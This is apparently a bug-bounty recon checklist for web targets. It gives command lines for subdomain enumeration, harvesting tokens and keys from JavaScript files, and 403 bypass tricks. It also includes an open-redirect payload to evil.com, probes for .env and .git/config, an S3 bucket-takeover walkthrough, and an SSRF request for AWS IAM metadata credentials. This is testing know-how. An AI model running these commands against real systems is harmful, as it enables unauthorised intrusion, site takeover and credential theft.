For Recon : 
[ ] - Use this command under a folder named as Target
	```assetfinder --subs-only target.com >> recon.txt  
	subfinder -d target.com -silent >> recon.txt  
	amass enum -passive -d target.com >> recon.txt  
	sort -u recon.txt > final-subs.txt
	cat final-subs.txt | httpx -status-code -title -tech-detect -silent > live-subs.txt```
[ ] - Check for `robots.txt` and `sitemap.xml` for subdomains and directories
[ ] - Checking for Secrets in JS FIles
	1. Download all the JS Files present.
	2. Use the command to grep the secrets, keys and tokens : 		```
		cat js_files.txt | while read url; do curl -s $url >> all_javascript_dump.txt; done  
		grep -iE "apikey|token|secret|authorization|bearer" all_javascript_dump.txt```
[ ] - Bruteforce checking all JiS Files : `ffuf -w common.txt -u https://target.com/assets/js/FUZZ`
[ ] - Always check User Agent for for Logs, it may give RFi
[ ] - Checking for 403 Forbidden : 
	[ ] - **Adding headers** (like `X-Forwarded-For`, `X-Originating-IP`)
	[ ] - **Trying HTTP methods** (`GET`, `POST`, `HEAD`, `OPTIONS`)
	[ ] - **Using URL encoding tricks** (`%2e`, `%2f`, etc.)
	[ ] - **Appending a dot (**`**.**`**) or a slash (**`**/**`**) at the end**
	[ ] - **Spoofing the Referer header** (`Referer: example.com/allowed-page`)
[ ] - Check for the parameter named `redirect` that is used to redirect the site to the internal sites and then try to pollute it like : `https://app.target.com/login?redirect=dashboard&redirect=https://evil.com`
[ ] - Required payloads to be tried once : 
	```curl https://target.com/config/settings_dev.json
	curl https://target.com/.env
	curl https://target.com/.git/config```
[ ] - Check for the Technology used in the website. If it's Wordpress then : 
	[ ]  -Try using a wp-scan with the API Key to get a full report.
	[ ] - Check the notes in INE-WAPT -> CMS Security Testing
	[ ] - 
[ ] - Check for AWS Buckets
	[ ] - Check CNAME using the command : `dig old-staging.target.com CNAME` . If the result looks like this : `old-staging.target.com.  300 IN CNAME  old-target-dev.s3-website-us-east-1.amazonaws.com.` Then use the command : `aws s3 ls s3://old-target-dev` to check for the existence of the bucket.
	If this has happened this shows that, the origin S3 bucket was gone, but is still present as the CNAME of the target. Now we can own the bucket under our account using the command : `aws s3 mb s3://old-target-dev` . Create a simple HTML Page to host the website. Upload it using the command : ```aws s3 website s3://old-target-dev --index-document index.html
	aws s3 cp index.html s3://old-target-dev/ --acl public-read```
	Then to chain it with SSRF, we can use this command by making some changes into it  : `curl -X POST http://old-staging.target.com/api/render -d '{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2Role"}'`
[ ] - 